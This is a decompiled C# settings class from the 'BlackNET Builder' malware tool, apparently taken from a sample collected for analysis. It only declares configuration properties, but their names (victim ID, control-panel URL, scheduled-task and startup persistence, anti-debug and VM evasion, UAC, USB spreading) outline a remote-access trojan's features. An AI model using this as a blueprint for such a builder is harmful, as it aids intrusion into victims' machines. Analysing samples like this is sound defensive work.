// Decompiled with JetBrains decompiler
// Type: BlackNET_Builder.My.MySettings
// Assembly: BlackNET Builder, Version=3.7.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4B8A14F4-2444-48A4-BCEA-3077100A9E22
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Agent.gen-f4461e8b0f3831b6ee77d57f52dd74f28e79114bc5bb29d6b7ab5ca3adbf27f6.exe

using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Threading;

namespace BlackNET_Builder.My
{
  [EditorBrowsable(EditorBrowsableState.Advanced)]
  [CompilerGenerated]
  [GeneratedCode("Microsoft.VisualStudio.Editors.SettingsDesigner.SettingsSingleFileGenerator", "12.0.0.0")]
  internal sealed class MySettings : ApplicationSettingsBase
  {
    private static MySettings defaultInstance = (MySettings) SettingsBase.Synchronized((SettingsBase) new MySettings());
    private static bool addedHandler;
    private static object addedHandlerLockObject = RuntimeHelpers.GetObjectValue(new object());

    [DebuggerNonUserCode]
    [EditorBrowsable(EditorBrowsableState.Advanced)]
    private static void AutoSaveSettings(object sender, EventArgs e)
    {
      if (!MyProject.Application.SaveMySettingsOnExit)
        return;
      MySettingsProperty.Settings.Save();
    }

    public static MySettings Default
    {
      get
      {
        if (!MySettings.addedHandler)
        {
          object handlerLockObject = MySettings.addedHandlerLockObject;
          ObjectFlowControl.CheckForSyncLockOnValueType(handlerLockObject);
          bool lockTaken = false;
          try
          {
            Monitor.Enter(handlerLockObject, ref lockTaken);
            if (!MySettings.addedHandler)
            {
              MyProject.Application.Shutdown += (ShutdownEventHandler) ((sender, e) =>
              {
                if (!MyProject.Application.SaveMySettingsOnExit)
                  return;
                MySettingsProperty.Settings.Save();
              });
              MySettings.addedHandler = true;
            }
          }
          finally
          {
            if (lockTaken)
              Monitor.Exit(handlerLockObject);
          }
        }
        return MySettings.defaultInstance;
      }
    }

    [UserScopedSetting]
    [DefaultSettingValue("")]
    [DebuggerNonUserCode]
    public string PanelURL
    {
      get => Conversions.ToString(this[nameof (PanelURL)]);
      set => this[nameof (PanelURL)] = (object) value;
    }

    [UserScopedSetting]
    [DefaultSettingValue("")]
    [DebuggerNonUserCode]
    public string VictimID
    {
      get => Conversions.ToString(this[nameof (VictimID)]);
      set => this[nameof (VictimID)] = (object) value;
    }

    [DebuggerNonUserCode]
    [DefaultSettingValue("")]
    [UserScopedSetting]
    public string MUTEX
    {
      get => Conversions.ToString(this[nameof (MUTEX)]);
      set => this[nameof (MUTEX)] = (object) value;
    }

    [UserScopedSetting]
    [DefaultSettingValue("")]
    [DebuggerNonUserCode]
    public string Splitter
    {
      get => Conversions.ToString(this[nameof (Splitter)]);
      set => this[nameof (Splitter)] = (object) value;
    }

    [UserScopedSetting]
    [DebuggerNonUserCode]
    [DefaultSettingValue("")]
    public string Filename
    {
      get => Conversions.ToString(this[nameof (Filename)]);
      set => this[nameof (Filename)] = (object) value;
    }

    [DebuggerNonUserCode]
    [UserScopedSetting]
    [DefaultSettingValue("False")]
    public bool Schtask
    {
      get => Conversions.ToBoolean(this[nameof (Schtask)]);
      set => this[nameof (Schtask)] = (object) value;
    }

    [UserScopedSetting]
    [DefaultSettingValue("False")]
    [DebuggerNonUserCode]
    public bool Startup
    {
      get => Conversions.ToBoolean(this[nameof (Startup)]);
      set => this[nameof (Startup)] = (object) value;
    }

    [DefaultSettingValue("False")]
    [DebuggerNonUserCode]
    [UserScopedSetting]
    public bool Watchdog
    {
      get => Conversions.ToBoolean(this[nameof (Watchdog)]);
      set => this[nameof (Watchdog)] = (object) value;
    }

    [UserScopedSetting]
    [DebuggerNonUserCode]
    [DefaultSettingValue("False")]
    public bool Stealth
    {
      get => Conversions.ToBoolean(this[nameof (Stealth)]);
      set => this[nameof (Stealth)] = (object) value;
    }

    [DebuggerNonUserCode]
    [UserScopedSetting]
    [DefaultSettingValue("False")]
    public bool AntiDebug
    {
      get => Conversions.ToBoolean(this[nameof (AntiDebug)]);
      set => this[nameof (AntiDebug)] = (object) value;
    }

    [UserScopedSetting]
    [DebuggerNonUserCode]
    [DefaultSettingValue("False")]
    public bool VM
    {
      get => Conversions.ToBoolean(this[nameof (VM)]);
      set => this[nameof (VM)] = (object) value;
    }

    [DebuggerNonUserCode]
    [UserScopedSetting]
    [DefaultSettingValue("False")]
    public bool UAC
    {
      get => Conversions.ToBoolean(this[nameof (UAC)]);
      set => this[nameof (UAC)] = (object) value;
    }

    [UserScopedSetting]
    [DebuggerNonUserCode]
    [DefaultSettingValue("False")]
    public bool USB
    {
      get => Conversions.ToBoolean(this[nameof (USB)]);
      set => this[nameof (USB)] = (object) value;
    }

    [DebuggerNonUserCode]
    [UserScopedSetting]
    [DefaultSettingValue("False")]
    public bool OneDrive
    {
      get => Conversions.ToBoolean(this[nameof (OneDrive)]);
      set => this[nameof (OneDrive)] = (object) value;
    }

    [DefaultSettingValue("False")]
    [DebuggerNonUserCode]
    [UserScopedSetting]
    public bool DropBox
    {
      get => Conversions.ToBoolean(this[nameof (DropBox)]);
      set => this[nameof (DropBox)] = (object) value;
    }

    [UserScopedSetting]
    [DebuggerNonUserCode]
    [DefaultSettingValue("False")]
    public bool Debug
    {
      get => Conversions.ToBoolean(this[nameof (Debug)]);
      set => this[nameof (Debug)] = (object) value;
    }
  }
}
